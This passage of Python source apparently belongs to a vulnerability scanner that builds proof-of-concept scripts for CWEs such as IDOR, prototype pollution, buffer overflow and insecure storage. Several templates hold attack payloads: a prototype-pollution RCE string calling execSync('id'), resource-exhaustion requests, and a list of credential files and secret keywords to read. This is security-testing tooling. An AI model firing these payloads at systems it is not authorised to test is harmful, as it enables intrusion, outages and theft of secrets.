        references=_refs(319, "A02:2021 Cryptographic Failures"),
    )]


# --------------------------------------------------------------------------- #
# CWE-614: Sensitive Cookie Without Secure Flag
# --------------------------------------------------------------------------- #

_COOKIE_FLAG_CODE = r'''%%HEADER%%
import requests
import sys

TARGET = "%%ENDPOINT%%"

if __name__ == "__main__":
    print("=== Cookie Security Flags PoC -- CWE-614 ===")
    print("Target: %s" % TARGET)
    session = requests.Session()
    session.headers["User-Agent"] = "Attestor-PoC/4.2"
    confirmed = False

    try:
        r = session.get(TARGET, timeout=10)
    except Exception as e:
        print("  [ERROR] %s" % e)
        sys.exit(2)

    for name, cookie in session.cookies.items():
        issues = []
        if not cookie.secure:
            issues.append("missing Secure flag")
        if not cookie.has_nonstandard_attr("HttpOnly"):
            issues.append("missing HttpOnly flag")
        if not cookie.has_nonstandard_attr("SameSite"):
            issues.append("missing SameSite attribute")

        if issues:
            print("  [VULNERABLE] Cookie '%s': %s" % (name, ", ".join(issues)))
            confirmed = True
        else:
            print("  [OK] Cookie '%s': all flags set" % name)

    for hdr in r.headers.get("Set-Cookie", "").split("\n"):
        if not hdr.strip():
            continue
        hdr_lower = hdr.lower()
        parts = []
        if "secure" not in hdr_lower:
            parts.append("Secure")
        if "httponly" not in hdr_lower:
            parts.append("HttpOnly")
        if "samesite" not in hdr_lower:
            parts.append("SameSite")
        if parts:
            cookie_name = hdr.split("=")[0].strip()
            print("  [VULNERABLE] Set-Cookie '%s' missing: %s" %
                  (cookie_name, ", ".join(parts)))
            confirmed = True

    if not session.cookies and "set-cookie" not in {k.lower() for k in r.headers}:
        print("  [INFO] No cookies set by this endpoint")

    print()
    if confirmed:
        print("RESULT: Cookie security flag issues confirmed")
        sys.exit(1)
    else:
        print("RESULT: Cookie flags appear adequate")
        sys.exit(0)
'''


@poc(614)
def _cookie_flags(f: PocFinding) -> list[ProofOfConcept]:
    code = _fill(_COOKIE_FLAG_CODE,
                 HEADER=_header(614, "Insecure Cookie Flags", f),
                 ENDPOINT=_endpoint(f))
    return [ProofOfConcept(
        cwe=614, title="Sensitive Cookie Without Secure Flag",
        code=code,
        verification="Cookies missing Secure/HttpOnly/SameSite attributes",
        vectors=("missing-secure", "missing-httponly", "missing-samesite"),
        references=_refs(614, "A05:2021 Security Misconfiguration"),
    )]


# --------------------------------------------------------------------------- #
# CWE-862: Missing Authorization
# --------------------------------------------------------------------------- #

_MISSING_AUTHZ_CODE = r'''%%HEADER%%
import requests
import sys

TARGET = "%%ENDPOINT%%"
PARAM = "%%PARAM%%"

IDOR_TESTS = [
    ("1", "first record"),
    ("2", "second record"),
    ("0", "zero ID"),
    ("-1", "negative ID"),
    ("99999", "high ID"),
    ("admin", "admin string"),
]

if __name__ == "__main__":
    print("=== Missing Authorization PoC -- CWE-862 ===")
    print("Target: %s" % TARGET)
    session = requests.Session()
    session.headers["User-Agent"] = "Attestor-PoC/4.2"
    confirmed = False

    accessible = []
    for test_id, label in IDOR_TESTS:
        url = TARGET.rstrip("/") + "/" + test_id
        try:
            r = session.get(url, timeout=10)
        except Exception as e:
            print("  [ERROR] %s (%s): %s" % (test_id, label, e))
            continue

        if r.status_code == 200 and len(r.text) > 50:
            print("  [ACCESSIBLE] ID=%s (%s): HTTP 200, %d bytes" %
                  (test_id, label, len(r.text)))
            accessible.append(test_id)
        elif r.status_code in (401, 403):
            print("  [BLOCKED] ID=%s (%s): HTTP %d" %
                  (test_id, label, r.status_code))
        elif r.status_code == 404:
            print("  [NOT FOUND] ID=%s (%s)" % (test_id, label))
        else:
            print("  [INFO] ID=%s (%s): HTTP %d" %
                  (test_id, label, r.status_code))

    if len(accessible) >= 2:
        print()
        print("  [VULNERABLE] Multiple records accessible without authorization")
        confirmed = True

    print()
    if confirmed:
        print("RESULT: Missing authorization / IDOR confirmed")
        sys.exit(1)
    else:
        print("RESULT: not confirmed -- manual verification recommended")
        sys.exit(0)
'''


@poc(862)
def _missing_authz(f: PocFinding) -> list[ProofOfConcept]:
    code = _fill(_MISSING_AUTHZ_CODE,
                 HEADER=_header(862, "Missing Authorization", f),
                 ENDPOINT=_endpoint(f), PARAM=_param(f))
    return [ProofOfConcept(
        cwe=862, title="Missing Authorization (IDOR)",
        code=code,
        verification="Multiple records accessible without authorization checks",
        vectors=("idor", "direct-object-reference", "horizontal-escalation"),
        references=_refs(862, "A01:2021 Broken Access Control"),
    )]


# --------------------------------------------------------------------------- #
# CWE-1321: Prototype Pollution
# --------------------------------------------------------------------------- #

_PROTO_POLLUTION_CODE = r'''%%HEADER%%
import requests
import sys
import json

TARGET = "%%ENDPOINT%%"
METHOD = "%%METHOD%%"

PAYLOADS = [
    {"__proto__": {"isAdmin": True}},
    {"constructor": {"prototype": {"isAdmin": True}}},
    {"__proto__": {"toString": "polluted"}},
    {"__proto__": {"valueOf": "polluted"}},
    json.loads('{"__proto__":{"polluted":"yes"}}'),
]

DETECTION_PAYLOADS = [
    {"__proto__": {"status": 500}},
    {"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id')//"}},
]


if __name__ == "__main__":
    print("=== Prototype Pollution PoC -- CWE-1321 ===")
    print("Target: %s" % TARGET)
    session = requests.Session()
    session.headers["User-Agent"] = "Attestor-PoC/4.2"
    session.headers["Content-Type"] = "application/json"
    confirmed = False

    for i, payload in enumerate(PAYLOADS + DETECTION_PAYLOADS):
        try:
            r = session.post(TARGET, json=payload, timeout=10)
        except Exception as e:
            print("  [ERROR] Payload %d: %s" % (i, e))
            continue

        if r.status_code == 500:
            print("  [POSSIBLE] Payload %d caused server error -- may indicate pollution" % i)
            confirmed = True
        elif "polluted" in r.text or "isAdmin" in r.text:
            print("  [VULNERABLE] Payload %d: polluted property reflected in response" % i)
            confirmed = True
        elif r.status_code == 200:
            print("  [ACCEPTED] Payload %d accepted (HTTP 200)" % i)

    print()
    if confirmed:
        print("RESULT: Prototype pollution likely")
        sys.exit(1)
    else:
        print("RESULT: not confirmed -- manual verification recommended")
        sys.exit(0)
'''


@poc(1321)
def _proto_pollution(f: PocFinding) -> list[ProofOfConcept]:
    code = _fill(_PROTO_POLLUTION_CODE,
                 HEADER=_header(1321, "Prototype Pollution", f),
                 ENDPOINT=_endpoint(f), METHOD=_method(f))
    return [ProofOfConcept(
        cwe=1321, title="Prototype Pollution",
        code=code,
        verification="Polluted property reflected or server error from __proto__ payload",
        vectors=("proto-injection", "constructor-pollution", "ejs-rce"),
        references=_refs(1321, "A03:2021 Injection"),
    )]


# --------------------------------------------------------------------------- #
# CWE-369: Divide By Zero
# --------------------------------------------------------------------------- #

_DIV_ZERO_CODE = r'''%%HEADER%%
import requests
import sys

TARGET = "%%ENDPOINT%%"
PARAM = "%%PARAM%%"
METHOD = "%%METHOD%%"

PAYLOADS = [
    ("0", "zero"),
    ("0.0", "float zero"),
    ("-0", "negative zero"),
    ("0e0", "scientific zero"),
    ("0x0", "hex zero"),
    ("00000", "leading zeros"),
]

if __name__ == "__main__":
    print("=== Divide By Zero PoC -- CWE-369 ===")
    print("Target: %s" % TARGET)
    session = requests.Session()
    session.headers["User-Agent"] = "Attestor-PoC/4.2"
    confirmed = False

    for value, label in PAYLOADS:
        try:
            if METHOD.upper() == "POST":
                r = session.post(TARGET, data={PARAM: value}, timeout=10)
            else:
                r = session.get(TARGET, params={PARAM: value}, timeout=10)
        except Exception as e:
            print("  [POSSIBLE] %s (%s) caused error: %s" % (value, label, e))
            continue

        if r.status_code >= 500:
            print("  [VULNERABLE] %s (%s) caused server error (%d)" %
                  (value, label, r.status_code))
            confirmed = True
        elif any(kw in r.text.lower() for kw in
                 ["division by zero", "zerodivision", "divide by zero",
                  "arithmeticexception", "infinity", "nan"]):
            print("  [VULNERABLE] %s (%s) triggered division error indicator" %
                  (value, label))
            confirmed = True

    print()
    if confirmed:
        print("RESULT: Division by zero confirmed")
        sys.exit(1)
    else:
        print("RESULT: not confirmed -- input validation appears present")
        sys.exit(0)
'''


@poc(369)
def _divide_by_zero(f: PocFinding) -> list[ProofOfConcept]:
    code = _fill(_DIV_ZERO_CODE,
                 HEADER=_header(369, "Divide By Zero", f),
                 ENDPOINT=_endpoint(f), PARAM=_param(f), METHOD=_method(f))
    return [ProofOfConcept(
        cwe=369, title="Divide By Zero",
        code=code,
        verification="Server error or exception message on zero input",
        vectors=("zero-int", "zero-float", "negative-zero"),
        references=_refs(369),
    )]


# --------------------------------------------------------------------------- #
# CWE-770: Allocation Without Limits
# --------------------------------------------------------------------------- #

_ALLOC_CODE = r'''%%HEADER%%
import requests
import sys
import time

TARGET = "%%ENDPOINT%%"
PARAM = "%%PARAM%%"

PAYLOADS = [
    ("100000000", "request 100M items"),
    ("999999999", "request ~1B items"),
    ("-1", "negative count"),
    ("0", "zero count"),
]

if __name__ == "__main__":
    print("=== Allocation Without Limits PoC -- CWE-770 ===")
    print("Target: %s" % TARGET)
    session = requests.Session()
    session.headers["User-Agent"] = "Attestor-PoC/4.2"
    confirmed = False

    for value, label in PAYLOADS:
        try:
            start = time.time()
            r = session.get(TARGET, params={PARAM: value}, timeout=30)
            elapsed = time.time() - start
        except requests.exceptions.Timeout:
            print("  [VULNERABLE] %s (%s) caused timeout" % (value, label))
            confirmed = True
            continue
        except Exception as e:
            print("  [ERROR] %s (%s): %s" % (value, label, e))
            continue

        if r.status_code >= 500:
            print("  [VULNERABLE] %s (%s) caused server error (%d)" %
                  (value, label, r.status_code))
            confirmed = True
        elif elapsed > 10:
            print("  [VULNERABLE] %s (%s) took %.1fs" %
                  (value, label, elapsed))
            confirmed = True

    print()
    if confirmed:
        print("RESULT: Uncontrolled allocation confirmed")
        sys.exit(1)
    else:
        print("RESULT: Allocation limits appear in place")
        sys.exit(0)
'''


@poc(770)
def _alloc_no_limits(f: PocFinding) -> list[ProofOfConcept]:
    code = _fill(_ALLOC_CODE,
                 HEADER=_header(770, "Allocation Without Limits", f),
                 ENDPOINT=_endpoint(f), PARAM=_param(f))
    return [ProofOfConcept(
        cwe=770, title="Allocation of Resources Without Limits",
        code=code,
        verification="Timeout or crash on large allocation request",
        vectors=("large-allocation", "negative-count", "memory-exhaustion"),
        references=_refs(770, "A05:2021 Security Misconfiguration"),
    )]


# --------------------------------------------------------------------------- #
# CWE-918: Server-Side Request Forgery (already exists above? check)
# — CWE-922: Insecure Storage of Sensitive Information
# --------------------------------------------------------------------------- #

_INSECURE_STORAGE_CODE = r'''%%HEADER%%
import os
import stat
import sys

TARGET_FILES = [
    "%%FILE%%",
    ".env",
    "config.json",
    "settings.py",
    "application.properties",
    "credentials.json",
    "secrets.yaml",
    "docker-compose.yml",
    ".git/config",
    "wp-config.php",
]

SENSITIVE_PATTERNS = [
    "password", "secret", "api_key", "apikey", "token", "private_key",
    "aws_access", "aws_secret", "database_url", "db_password",
    "smtp_password", "sendgrid", "twilio", "stripe",
]

if __name__ == "__main__":
    print("=== Insecure Storage PoC -- CWE-922 ===")
    print("Checking: %%FILE%%")
    confirmed = False

    for target in TARGET_FILES:
        if not os.path.exists(target):
            continue

        try:
            st = os.stat(target)
            mode = stat.filemode(st.st_mode)
            world_readable = st.st_mode & stat.S_IROTH
        except OSError:
            continue

        if world_readable:
            print("  [VULNERABLE] %s is world-readable (%s)" % (target, mode))
            confirmed = True

        try:
            with open(target, "r", errors="ignore") as f:
                content = f.read(8192).lower()
            for pattern in SENSITIVE_PATTERNS:
                if pattern in content:
                    print("  [SENSITIVE] %s contains '%s'" % (target, pattern))
                    confirmed = True
                    break
        except PermissionError:
            pass

    print()
    if confirmed:
        print("RESULT: Insecure storage of sensitive information confirmed")
        sys.exit(1)
    else:
        print("RESULT: No insecure storage detected in checked files")
        sys.exit(0)
'''


@poc(922)
def _insecure_storage(f: PocFinding) -> list[ProofOfConcept]:
    code = _fill(_INSECURE_STORAGE_CODE,
                 HEADER=_header(922, "Insecure Storage", f),
                 FILE=f.file_path)
    return [ProofOfConcept(
        cwe=922, title="Insecure Storage of Sensitive Information",
        code=code,
        verification="Sensitive files world-readable or contain plaintext secrets",
        vectors=("world-readable", "plaintext-secrets", "exposed-config"),
        prerequisites=("python3",),
        references=_refs(922, "A02:2021 Cryptographic Failures"),
    )]


# --------------------------------------------------------------------------- #
# CWE-120: Buffer Overflow (Classic)
# --------------------------------------------------------------------------- #

_BUFFER_OVERFLOW_CODE = r'''%%HEADER%%
import requests
import sys

TARGET = "%%ENDPOINT%%"
PARAM = "%%PARAM%%"
METHOD = "%%METHOD%%"

PAYLOADS = [
    ("A" * 256, "256 bytes"),
    ("A" * 1024, "1KB"),
    ("A" * 4096, "4KB"),
    ("A" * 65536, "64KB"),
    ("%s" * 100, "100 format strings"),
    ("\x00" * 256, "256 null bytes"),
    ("A" * 256 + "\x41\x41\x41\x41", "overflow + return address"),
]

if __name__ == "__main__":
    print("=== Buffer Overflow PoC -- CWE-120 ===")
    print("Target: %s" % TARGET)
    session = requests.Session()
    session.headers["User-Agent"] = "Attestor-PoC/4.2"
    confirmed = False

    for payload, label in PAYLOADS:
        try:
            if METHOD.upper() == "POST":
                r = session.post(TARGET, data={PARAM: payload}, timeout=10)
            else:
                r = session.get(TARGET, params={PARAM: payload[:5000]}, timeout=10)
        except requests.exceptions.ConnectionError:
            print("  [VULNERABLE] %s caused connection reset (crash?)" % label)
            confirmed = True
            continue
        except Exception as e:
            print("  [POSSIBLE] %s caused error: %s" % (label, e))
            continue

        if r.status_code >= 500:
            print("  [VULNERABLE] %s caused server error (%d)" %
                  (label, r.status_code))
            confirmed = True
        elif "segfault" in r.text.lower() or "core dump" in r.text.lower():
            print("  [VULNERABLE] %s triggered segfault indicator" % label)
            confirmed = True

    print()
    if confirmed:
        print("RESULT: Buffer overflow indicators confirmed")
        sys.exit(1)
    else:
        print("RESULT: not confirmed -- manual verification recommended")
        sys.exit(0)
'''


@poc(120)
def _buffer_overflow(f: PocFinding) -> list[ProofOfConcept]:
    code = _fill(_BUFFER_OVERFLOW_CODE,
                 HEADER=_header(120, "Buffer Overflow", f),
                 ENDPOINT=_endpoint(f), PARAM=_param(f), METHOD=_method(f))
    return [ProofOfConcept(
        cwe=120, title="Buffer Copy Without Checking Size of Input",
        code=code,
        verification="Server crash or error on oversized input",
        vectors=("stack-overflow", "heap-overflow", "format-string"),
        references=_refs(120, "", "100"),
    )]


# --------------------------------------------------------------------------- #
# CWE-250: Execution with Unnecessary Privileges
# --------------------------------------------------------------------------- #

_UNNECESSARY_PRIV_CODE = r'''%%HEADER%%
import os
import sys

if __name__ == "__main__":
    print("=== Unnecessary Privileges PoC -- CWE-250 ===")
    print("File: %%FILE%%:%%LINE%%")
    print()
    confirmed = False

    euid = os.geteuid() if hasattr(os, "geteuid") else -1
    egid = os.getegid() if hasattr(os, "getegid") else -1
    print("  Effective UID: %d" % euid)
    print("  Effective GID: %d" % egid)

    if euid == 0:
        print("  [VULNERABLE] Process running as root (UID 0)")
        confirmed = True
    elif euid < 1000 and euid > 0:
        print("  [WARNING] Process running as system user (UID %d)" % euid)
        confirmed = True

    try:
        import grp
        groups = os.getgroups()
        group_names = []
        for gid in groups:
            try:
                group_names.append(grp.getgrgid(gid).gr_name)
            except KeyError:
                group_names.append(str(gid))
        print("  Groups: %s" % ", ".join(group_names))
        privileged = {"root", "wheel", "sudo", "admin", "docker"}
        overlap = set(group_names) & privileged
        if overlap:
            print("  [WARNING] Member of privileged groups: %s" %
                  ", ".join(overlap))
    except ImportError:
        pass

    suid_check = os.path.isfile("%%FILE%%")
    if suid_check:
        try:
            import stat
            st = os.stat("%%FILE%%")
            if st.st_mode & stat.S_ISUID:
                print("  [VULNERABLE] File has SUID bit set")
                confirmed = True
            if st.st_mode & stat.S_ISGID:
                print("  [WARNING] File has SGID bit set")
        except OSError:
            pass

    print()
    if confirmed:
        print("RESULT: Unnecessary privileges detected")
        sys.exit(1)
    else:
        print("RESULT: Privilege level appears appropriate")
        sys.exit(0)
'''


@poc(250)
def _unnecessary_privileges(f: PocFinding) -> list[ProofOfConcept]:
    code = _fill(_UNNECESSARY_PRIV_CODE,
                 HEADER=_header(250, "Unnecessary Privileges", f),
                 FILE=f.file_path, LINE=str(f.line))
    return [ProofOfConcept(
        cwe=250, title="Execution with Unnecessary Privileges",
        code=code,
        verification="Process running as root or with SUID bit",
        vectors=("root-execution", "suid-binary", "privileged-groups"),
        prerequisites=("python3", "Linux/macOS"),
        references=_refs(250, "A04:2021 Insecure Design"),
    )]


# --------------------------------------------------------------------------- #
# CWE-476: NULL Pointer Dereference
# --------------------------------------------------------------------------- #

_NULL_DEREF_CODE = r'''%%HEADER%%
import requests
import sys

TARGET = "%%ENDPOINT%%"
PARAM = "%%PARAM%%"
METHOD = "%%METHOD%%"

PAYLOADS = [
    ("", "empty string"),
    ("null", "null string"),
    ("None", "None string"),
    ("undefined", "undefined string"),
    ("nil", "nil string"),
]

if __name__ == "__main__":
    print("=== NULL Pointer Dereference PoC -- CWE-476 ===")
    print("Target: %s" % TARGET)
    session = requests.Session()
    session.headers["User-Agent"] = "Attestor-PoC/4.2"
    confirmed = False

    for value, label in PAYLOADS:
        try:
            if METHOD.upper() == "POST":
                r = session.post(TARGET, data={PARAM: value}, timeout=10)
            else:
                r = session.get(TARGET, params={PARAM: value}, timeout=10)
        except requests.exceptions.ConnectionError:
            print("  [VULNERABLE] %s caused connection reset (crash?)" % label)
            confirmed = True
            continue
        except Exception as e:
            print("  [ERROR] %s: %s" % (label, e))
            continue

        if r.status_code >= 500:
            print("  [VULNERABLE] %s caused server error (%d)" %
                  (label, r.status_code))
            confirmed = True
        elif any(kw in r.text.lower() for kw in
                 ["nullpointer", "nullptr", "null reference",
                  "nonetype", "attributeerror: 'none'", "segfault"]):
            print("  [VULNERABLE] %s triggered null dereference indicator" %
                  label)
            confirmed = True

    print()
    if confirmed:
        print("RESULT: NULL pointer dereference confirmed")
        sys.exit(1)
    else:
        print("RESULT: not confirmed")
        sys.exit(0)
'''


@poc(476)
def _null_deref(f: PocFinding) -> list[ProofOfConcept]:
    code = _fill(_NULL_DEREF_CODE,
                 HEADER=_header(476, "NULL Pointer Dereference", f),
                 ENDPOINT=_endpoint(f), PARAM=_param(f), METHOD=_method(f))
    return [ProofOfConcept(
        cwe=476, title="NULL Pointer Dereference",
        code=code,
        verification="Server crash or null reference error on empty/null input",
        vectors=("null-input", "empty-input", "none-input"),
        references=_refs(476),
    )]
